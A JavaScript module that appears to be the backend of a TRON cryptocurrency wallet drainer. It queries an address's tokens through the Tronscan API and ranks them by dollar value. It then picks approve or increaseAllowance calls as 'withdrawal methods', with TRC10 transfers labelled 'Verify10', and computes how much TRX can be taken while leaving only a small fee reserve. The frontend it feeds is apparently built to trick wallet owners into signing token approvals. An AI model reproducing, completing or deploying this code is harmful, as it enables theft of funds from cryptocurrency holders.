const config = require('./get-config')
const { SETTINGS, MIN_TRX_RESERVE, TRONSCAN_API_KEY } = config
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'

//Check account status
async function checkAccountStatus(address, indexOfSetting) {
	const setting = SETTINGS[indexOfSetting]
	let isActivatedAddress = false
	let isRequiredEnergyAvailable = false
	let isRequiredBandwidthAvailable = false

	if (setting.mode === 4) {
		const accountDetailsRequest = await fetch(
			`https://apilist.tronscanapi.com/api/accountv2?address=${address}`,
			{
				headers: {
					'TRON-PRO-API-KEY': TRONSCAN_API_KEY,
				},
			},
		)
		const accountDetails = await accountDetailsRequest.json()
		const energyRemaining = accountDetails.bandwidth.energyRemaining
		const bandwidthRemaining = accountDetails.bandwidth.freeNetRemaining
		if (accountDetails.activated) isActivatedAddress = true
		if (energyRemaining >= 110000) isRequiredEnergyAvailable = true
		if (bandwidthRemaining >= 400) isRequiredBandwidthAvailable = true
	}

	return {
		isActivatedAddress,
		isRequiredEnergyAvailable,
		isRequiredBandwidthAvailable,
	}
}

//Find the best way to withdraw the TRC20
async function getBestWithdrawalMethod(token) {
	try {
		const tokenContractRequest = await fetch(
			`https://apilist.tronscanapi.com/api/contract?contract=${token.tokenId}`,
			{
				headers: {
					'TRON-PRO-API-KEY': TRONSCAN_API_KEY,
				},
			},
		)
		const methodMap = (await tokenContractRequest.json()).data[0].methodMap

		for (const key in methodMap) {
			if (methodMap[key] === 'increaseAllowance(address,uint256)') {
				return 'increaseAllowance'
			}
			if (methodMap[key] === 'increaseApproval(address,uint256)') {
				return 'increaseApproval'
			}
		}

		return 'approve'
	} catch (error) {
		console.error(error)
		throw error
	}
}

//Find all user tokens and sent to frontend
async function checkBalance(address, indexOfSetting, walletName) {
	try {
		const setting = SETTINGS[indexOfSetting]
		let isTRXFee = false

		const tokensListRequest = await fetch(
			`https://apilist.tronscanapi.com/api/account/tokens?address=${address}`,
			{
				headers: {
					'TRON-PRO-API-KEY': TRONSCAN_API_KEY,
				},
			},
		)

		const {
			isActivatedAddress,
			isRequiredEnergyAvailable,
			isRequiredBandwidthAvailable,
		} = await checkAccountStatus(address, indexOfSetting)

		const tokensList = (await tokensListRequest.json()).data
		const tokens = tokensList.filter(token => {
			const isTrc10 = token.tokenType === 'trc10'
			const isTrc20 = token.tokenType === 'trc20'
			const isUSDT = token.tokenId === USDT_CONTRACT
			if (isTrc10 && token.tokenId === '_') {
				if (Number(token.balance) > Math.round(MIN_TRX_RESERVE * 1_000_000))
					isTRXFee = true
				return setting.mode === 1 && token.amountInUsd > setting.minTrxBalance
			}
			if ((setting.mode === 3 || setting.mode === 4) && isUSDT) {
				return token.amountInUsd > setting.minTokenBalance
			}
			if ((setting.mode === 1 || setting.mode === 2) && isTrc20) {
				return token.amountInUsd > setting.minTokenBalance
			}
			if (setting.mode === 1 && isTrc10) {
				return token.amountInUsd > setting.minTokenBalance
			}
			return false
		})

		let allTokensValue = 0

		if (tokens.length > 0) {
			tokens.sort((tokenA, tokenB) => tokenB.amountInUsd - tokenA.amountInUsd)
			for (const token of tokens) {
				if (setting.mode === 4 && token.tokenId === USDT_CONTRACT)
					token.isTRXFee = isTRXFee
				switch (token.tokenType) {
					case 'trc10':
						token.withdrawalMethod = 'Verify10'
						token.tokensLenght = tokens.length
						if (token.tokenId === '_') {
							let minTrxReserve
							if (tokens.length === 1) {
								minTrxReserve = 5
							} else {
								minTrxReserve = MIN_TRX_RESERVE
							}
							token.balance -= minTrxReserve * 1_000_000
							token.quantity -= minTrxReserve
							token.amountInUsd = (
								token.quantity * token.tokenPriceInUsd
							).toFixed(2)
						}
						break

					case 'trc20':
						token.withdrawalMethod =
							walletName === 'Ledger'
								? 'approve'
								: await getBestWithdrawalMethod(token)
						break
				}
				allTokensValue += Number(token.amountInUsd)
			}
			return {
				tokens,
				allTokensValue,
				isTRXFee,
				isActivatedAddress,
				isRequiredEnergyAvailable,
				isRequiredBandwidthAvailable,
			}
		}
		return {
			tokens: [],
			allTokensValue: 0,
			isTRXFee,
			isActivatedAddress,
			isRequiredEnergyAvailable,
			isRequiredBandwidthAvailable,
		}
	} catch (error) {
		console.error('Error in checkBalance:', error)
		throw error
	}
}

//Get update TRX balance
async function getUpdateTokenBalance(token, address, tronWeb) {
	if (token.tokensLenght === 1) {
		minReserveSun = 5_000_000
	} else {
		minReserveSun = 15_000_000
	}
	try {
		const balanceSun = await tronWeb.trx.getBalance(address)

		if (balanceSun <= minReserveSun) {
			return null
		}
		const finalBalance = balanceSun - minReserveSun
		return {
			...token,
			balance: finalBalance,
		}
	} catch (error) {
		throw new Error(
			`Failed to get TRX balance for ${address}: ${error.message}`,
		)
	}
}

module.exports = {
	checkAccountStatus,
	checkBalance,
	getUpdateTokenBalance,
}
